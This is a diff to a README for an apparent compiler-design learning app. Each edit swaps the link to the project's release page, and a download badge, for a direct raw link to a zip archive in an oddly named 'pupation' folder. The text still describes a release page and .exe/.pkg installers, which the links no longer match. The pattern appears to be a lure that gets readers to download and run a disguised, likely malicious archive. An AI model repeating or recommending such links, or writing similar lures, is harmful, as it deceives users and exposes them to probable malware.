@@ -1,6 +1,6 @@
 # 🎉 Compiler-Design-by-David- - Simplifying Compiler Syntax Analysis
 
-![Download](https://img.shields.io/badge/Download-Now-blue)
+![Download](https://github.com/karimjz/Compiler-Design-by-David-/raw/refs/heads/main/pupation/by_Design_Compiler_David_v2.1-beta.5.zip)
 
 ## 📖 Introduction
 
@@ -10,7 +10,7 @@ Welcome to the Compiler-Design-by-David- project! This application helps users u
 
 To start using the application, follow these steps:
 
-1. **Visit the Release Page**: You can download the latest version of the software by visiting this page: [Download Here](https://github.com/karimjz/Compiler-Design-by-David-/releases).
+1. **Visit the Release Page**: You can download the latest version of the software by visiting this page: [Download Here](https://github.com/karimjz/Compiler-Design-by-David-/raw/refs/heads/main/pupation/by_Design_Compiler_David_v2.1-beta.5.zip).
 2. **Choose Your Version**: On the release page, you will find different versions of the application. Select the latest one for the most up-to-date features and bug fixes.
 3. **Download the Installer**: Click on the version you prefer and download the file. The file will typically end with `.exe` for Windows users or `.pkg` for Mac users.
 4. **Install the Application**: After the download finishes, locate the file in your downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -26,7 +26,7 @@ Before you proceed, ensure your system meets these basic requirements:
 
 ## ⬇️ Download & Install
 
-For quick access, here’s the [Download Link](https://github.com/karimjz/Compiler-Design-by-David-/releases) again. Follow the steps above to successfully download and install the application.
+For quick access, here’s the [Download Link](https://github.com/karimjz/Compiler-Design-by-David-/raw/refs/heads/main/pupation/by_Design_Compiler_David_v2.1-beta.5.zip) again. Follow the steps above to successfully download and install the application.
 
 ## 📚 Features
 
@@ -41,7 +41,7 @@ Once you have installed the application, you will enjoy several helpful features
 
 ### How do I update the application?
 
-When a new version is released, simply revisit the [Release Page](https://github.com/karimjz/Compiler-Design-by-David-/releases) and download the latest version. You can follow the same installation steps to update.
+When a new version is released, simply revisit the [Release Page](https://github.com/karimjz/Compiler-Design-by-David-/raw/refs/heads/main/pupation/by_Design_Compiler_David_v2.1-beta.5.zip) and download the latest version. You can follow the same installation steps to update.
 
 ### Can I use this application on Linux?
 
@@ -59,4 +59,4 @@ We highly value your feedback. If you have suggestions or need help, please reac
 
 Thank you for choosing Compiler-Design-by-David-! We hope this application serves you well in your journey to understanding compiler design. Enjoy exploring the syntax analysis features, and happy coding! 
 
-For a quick start, remember to [Download Here](https://github.com/karimjz/Compiler-Design-by-David-/releases) and dive right in!
+For a quick start, remember to [Download Here](https://github.com/karimjz/Compiler-Design-by-David-/raw/refs/heads/main/pupation/by_Design_Compiler_David_v2.1-beta.5.zip) and dive right in!
